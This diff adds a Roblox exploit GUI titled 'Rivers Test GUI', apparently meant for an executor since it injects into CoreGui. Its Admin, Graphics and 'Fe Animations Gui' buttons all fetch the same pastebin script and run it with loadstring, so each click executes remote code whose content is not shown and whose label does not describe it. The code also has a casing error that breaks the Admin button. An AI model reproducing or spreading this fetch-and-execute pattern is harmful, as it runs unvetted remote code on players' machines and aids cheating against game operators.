@@ -1,0 +1,123 @@
+-- Gui to Lua
+-- Version: 3.2
+ 
+-- Instances:
+ 
+local rivertestgui = Instance.new("ScreenGui")
+local mainframe = Instance.new("Frame")
+local Adminbutton = Instance.new("TextButton")
+local TextLabel = Instance.new("TextLabel")
+local openbutton = Instance.new("TextButton")
+local graphicsbutton = Instance.new("TextButton")
+local feanimationguibutton = Instance.new("TextButton")
+local closebutton = Instance.new("TextButton")
+ 
+--Properties:
+ 
+rivertestgui.Name = "rivertestgui"
+rivertestgui.Parent = game.CoreGui
+rivertestgui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+ 
+mainframe.Name = "mainframe"
+mainframe.Parent = rivertestgui
+mainframe.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+mainframe.Position = UDim2.new(0.327915877, 0, 0.114331722, 0)
+mainframe.Size = UDim2.new(0, 509, 0, 241)
+mainframe.Style = Enum.FrameStyle.ChatRed
+ 
+Adminbutton.Name = "Adminbutton"
+Adminbutton.Parent = mainframe
+Adminbutton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Adminbutton.Position = UDim2.new(0.0172514245, 0, 0.347409517, 0)
+Adminbutton.Size = UDim2.new(0, 92, 0, 39)
+Adminbutton.Style = Enum.ButtonStyle.RobloxRoundDefaultButton
+Adminbutton.Font = Enum.Font.ArialBold
+Adminbutton.Text = "Admin"
+Adminbutton.TextColor3 = Color3.fromRGB(0, 0, 0)
+Adminbutton.TextSize = 14.000
+Adminbutton.TextWrapped = true
+adminbutton.MouseButton1Down:connect(function()
+loadstring(game:HttpGet("https://pastebin.com/raw/XwQciZ4y", true))()
+end)
+ 
+TextLabel.Parent = mainframe
+TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.BorderSizePixel = 0
+TextLabel.Position = UDim2.new(0.271119833, 0, -0.0871369541, 0)
+TextLabel.Size = UDim2.new(0, 200, 0, 50)
+TextLabel.Font = Enum.Font.ArialBold
+TextLabel.Text = "Rivers Test GUI"
+TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.TextSize = 14.000
+ 
+openbutton.Name = "openbutton"
+openbutton.Parent = rivertestgui
+openbutton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+openbutton.Position = UDim2.new(0.018164441, 0, 0.516908169, 0)
+openbutton.Size = UDim2.new(0, 200, 0, 50)
+openbutton.Style = Enum.ButtonStyle.RobloxRoundDropdownButton
+openbutton.Font = Enum.Font.ArialBold
+openbutton.Text = "Open"
+openbutton.TextColor3 = Color3.fromRGB(0, 0, 0)
+openbutton.TextSize = 14.000
+openbutton.MouseButton1Down:connect(function()
+mainframe.Visible = true
+openbutton.Visible = false
+end)
+ 
+graphicsbutton.Name = "graphicsbutton"
+graphicsbutton.Parent = rivertestgui
+graphicsbutton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+graphicsbutton.Position = UDim2.new(0.696027756, 0, 0.257232368, 0)
+graphicsbutton.Size = UDim2.new(0, 92, 0, 39)
+graphicsbutton.Style = Enum.ButtonStyle.RobloxRoundDefaultButton
+graphicsbutton.Font = Enum.Font.ArialBold
+graphicsbutton.Text = "Graphics"
+graphicsbutton.TextColor3 = Color3.fromRGB(0, 0, 0)
+graphicsbutton.TextSize = 14.000
+graphicsbutton.MouseButton1Down:connect(function()
+loadstring(game:HttpGet("https://pastebin.com/raw/XwQciZ4y", true))()
+end)
+ 
+feanimationguibutton.Name = "feanimationguibutton"
+feanimationguibutton.Parent = rivertestgui
+feanimationguibutton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+feanimationguibutton.Position = UDim2.new(0.497175008, 0, 0.257232368, 0)
+feanimationguibutton.Size = UDim2.new(0, 127, 0, 39)
+feanimationguibutton.Style = Enum.ButtonStyle.RobloxRoundDefaultButton
+feanimationguibutton.Font = Enum.Font.ArialBold
+feanimationguibutton.Text = "Fe Animations Gui"
+feanimationguibutton.TextColor3 = Color3.fromRGB(0, 0, 0)
+feanimationguibutton.TextScaled = true
+feanimationguibutton.TextSize = 14.000
+feanimationguibutton.TextWrapped = true
+feanimationguibutton.MouseButton1Down:connect(function()
+loadstring(game:HttpGet("https://pastebin.com/raw/XwQciZ4y", true))()
+end)
+ 
+closebutton.Name = "closebutton"
+closebutton.Parent = rivertestgui
+closebutton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+closebutton.Position = UDim2.new(0.777289629, 0, 0.112304837, 0)
+closebutton.Size = UDim2.new(0, 38, 0, 32)
+closebutton.Style = Enum.ButtonStyle.RobloxRoundDefaultButton
+closebutton.Font = Enum.Font.ArialBold
+closebutton.Text = "X"
+closebutton.TextColor3 = Color3.fromRGB(0, 0, 0)
+closebutton.TextSize = 14.000
+closebutton.MouseButton1Down:connect(function()
+openbutton.Visible = true
+mainframe.Visible = false
+end)
+ 
+-- Scripts:
+ 
+local function ADPCEYX_fake_script() -- mainframe.LocalScript 
+	local script = Instance.new('LocalScript', mainframe)
+ 
+	script.parent.Selectable = true
+	script.Parent.Active = true
+	script.parent.Draggable = true
+end
+coroutine.wrap(ADPCEYX_fake_script)()
+ 
